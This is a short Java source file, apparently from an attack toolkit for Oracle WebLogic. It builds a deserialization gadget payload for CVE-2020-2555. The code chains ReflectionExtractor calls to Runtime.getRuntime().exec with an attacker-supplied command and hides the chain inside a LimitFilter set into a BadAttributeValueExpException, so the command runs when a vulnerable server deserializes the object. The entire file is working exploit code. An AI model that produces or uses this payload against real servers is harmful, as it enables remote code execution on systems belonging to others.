package unserWeblogic.gadgets;


import com.tangosol.util.ValueExtractor;
import com.tangosol.util.extractor.ChainedExtractor;
import com.tangosol.util.extractor.ReflectionExtractor;
import com.tangosol.util.filter.LimitFilter;
import javax.management.BadAttributeValueExpException;
import java.lang.reflect.Field;

public class CVE_2020_2555 implements ObjectPayload<Object>{
    public Object getObject(final String command) throws Exception {
        ValueExtractor[] valueExtractors = new ValueExtractor[]{
                new ReflectionExtractor("getMethod", new Object[]{
                        "getRuntime", new Class[0]
                }),
                new ReflectionExtractor("invoke", new Object[]{null, new Object[0]}),
                new ReflectionExtractor("exec", new Object[]{new String[]{command}})
        };
        //初始化LimitFiler类实例
        LimitFilter limitFilter = new LimitFilter();
        limitFilter.setTopAnchor(Runtime.class);
        BadAttributeValueExpException expException = new BadAttributeValueExpException(null);
        Field m_comparator = limitFilter.getClass().getDeclaredField("m_comparator");
        m_comparator.setAccessible(true);
        m_comparator.set(limitFilter, new ChainedExtractor(valueExtractors));
        Field m_oAnchorTop = limitFilter.getClass().getDeclaredField("m_oAnchorTop");
        m_oAnchorTop.setAccessible(true);
        m_oAnchorTop.set(limitFilter, Runtime.class);
//        limitFilter.toString();
        //将limitFilter放入BadAttributeValueExpException的val属性中
        Field val = expException.getClass().getDeclaredField("val");
        val.setAccessible(true);
        val.set(expException, limitFilter);
        return expException;
    }
}
